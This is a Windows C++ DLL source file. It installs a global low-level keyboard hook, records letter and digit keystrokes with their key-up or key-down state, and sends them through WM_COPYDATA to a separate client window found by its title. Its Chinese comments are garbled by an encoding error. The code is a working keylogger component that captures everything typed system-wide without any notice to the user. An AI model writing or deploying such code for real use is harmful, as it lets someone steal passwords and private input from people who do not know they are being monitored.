// dllmain.cpp : ���� DLL Ӧ�ó������ڵ㡣
#include "stdafx.h"
HHOOK g_hhk;
HWND g_hwnd;
LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam)
{
	
	if ((wParam>='A'&&wParam<='Z')|| (wParam >= '0'&&wParam <= '9'))
	{
		char a[99] = {0 };
		if ((lParam >> 31) & 1)
		{
			strcat(a,"up---");
		}
		else
		{
			strcat(a, "down-");
		}
		char b[3] = { wParam ,'\t','\0' };
		strcat(a, b);
		//�����ݷ�װ����ͨ��WM_COPYDATA��Ϣ���ͳ�ȥ
		COPYDATASTRUCT cds;
		cds.dwData = 0;
		cds.cbData = strlen(a) + 1;
		cds.lpData = a;
		OutputDebugStringA((char*)cds.lpData);
		SendMessageA(g_hwnd, WM_COPYDATA, (WPARAM)g_hwnd, (LPARAM)&cds);
	}
	
	//������һ������,���Ǹ��淶
	return CallNextHookEx(g_hhk, code, wParam, lParam);
}


HINSTANCE g_hModule;
//dll���������ṩ����������ʹ��
BOOL MySetHook()
{
	g_hhk = SetWindowsHookEx(WH_KEYBOARD_LL,//�������ͣ����̹���
		(HOOKPROC)KeyboardProc,//�ص�����
		g_hModule,//��dll��ʼ������øþ��
		0);//�߳�id����0��ʾ������

		if (g_hhk == NULL)
		{
			MessageBoxA(0,"�¹���ʧ��","",0);
			return false;
		}
		OutputDebugStringA("�¹��ӳɹ�\r\n");
	return true;
}
char a[99] = { 0 };
//dll���������ṩ����������ʹ��
void DllGetHwnd(HWND hWn)
{
	g_hwnd = FindWindow(NULL, L"�ҵĿͻ���");
	ZeroMemory(a, 99);
	sprintf(a, "\r\ng_hwnd:%X\r\n", g_hwnd);
	OutputDebugStringA(a);
}




BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		g_hModule = hModule;
		g_hwnd = FindWindow(NULL, L"�ҵĿͻ���");
		ZeroMemory(a, 99);
		sprintf(a, "\r\ng_hwnd:%X\r\n", g_hwnd);
		OutputDebugStringA(a);
		break;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

